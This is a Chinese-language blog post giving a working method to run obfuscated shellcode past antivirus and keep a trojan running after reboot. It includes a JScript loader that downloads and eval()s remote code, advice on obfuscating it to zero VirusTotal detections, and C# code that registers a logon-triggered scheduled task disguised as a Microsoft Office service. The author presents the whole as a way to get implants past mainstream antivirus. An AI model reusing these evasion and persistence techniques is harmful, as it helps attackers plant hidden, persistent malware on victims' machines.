+++
title = "免杀shellcode并绕过杀毒添加自启动"
author = "Hzllaga"
date = 2020-02-17
categories = [ "原创" ]
tags = ["免杀","shellcode"]
+++
首先得处理好shellcode，尽量把添加自启动的操作独立成一个Loader，可以避免杀毒软件检测到特征并拦截，这边选择的是利用Javascript来处理Shellcode，而添加自启动的操作由C#来控制，并成功实现了绕过360核晶防护添加计划任务完成木马自启动。<!--more--> 
Shellcode的部分用CACTUSTORCH完成，链接：[CACTUSTORCH](https://github.com/mdsecactivebreach/CACTUSTORCH)
也可以自己C#编译一个再用DotNetToJScript转Javascript语言，教程：[免杀 MSF Windows Payload 的方法与实践](../免杀-msf-windows-payload-的方法与实践/)

处理完的js脚本，推荐使用sojson的混淆代码，可以实现virustotal的57引擎0报毒，链接：[Js加密](https://www.sojson.com/jsobfuscator.html)，我一个18年处理的msf shellcode到现在还是0报毒。

因为混淆了，所以体积自然会变很大，这边提供一个网络加载的方式，可以把体积缩小到4kb：
{{< highlight JavaScript >}}
var xml=new ActiveXObject("Microsoft.XMLHTTP");
xml.open("GET","http://127.0.0.1/ccc.js",false);
xml.send();
var aaa=xml.responseText;
eval(aaa);
{{< /highlight >}}
因为是WSH模式的，当然还能用`WScript.Arguments.Item(0);`的方式来传递代码，可以直接注入一个加密的代码，然后在写一段解密的代码会更隐蔽。

再来谈谈添加自启动，因为程序现在不需要处理上面那些行为，所以杀毒不会拦截，代码：
{{< highlight csharp>}}
TaskSchedulerClass scheduler = new TaskSchedulerClass();
//连接
scheduler.Connect(null, null, null, null);
//获取创建任务的目录
ITaskFolder folder = scheduler.GetFolder("\\");
//设置参数
ITaskDefinition task = scheduler.NewTask(0);
task.RegistrationInfo.Author = "Microsoft Office";//创建者
task.RegistrationInfo.Description = "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.";//描述
//设置触发机制（此处是 登陆后）
task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON);
//设置动作（此处为运行exe程序）
IExecAction action = (IExecAction)task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
action.Path = Path.GetTempPath() + @"\" + file + ".exe";//设置文件目录
task.Settings.ExecutionTimeLimit = "PT0S"; //运行任务时间超时停止任务吗? PTOS 不开启超时
task.Settings.DisallowStartIfOnBatteries = false;//只有在交流电源下才执行
task.Settings.RunOnlyIfIdle = false;//仅当计算机空闲下才执行

IRegisteredTask regTask =
    folder.RegisterTaskDefinition("Office ClickToRun Service Monitor", task,//此处需要设置任务的名称（name）
    (int)_TASK_CREATION.TASK_CREATE, null, //user
    null, // password
    _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN,
    "");
IRunningTask runTask = regTask.Run(null);
{{< /highlight >}}
程序添加完自启动，还能顺便把上面网络加载的js脚本释放出来并运行，到发布日期0217能过各种主流杀毒不被查杀并正常上线。![](https://cdn.wtfsec.org/img/20200222165121.png)
相关代码已经发布在Github上，链接：[https://github.com/Hzllaga/JsLoader](https://github.com/Hzllaga/JsLoader)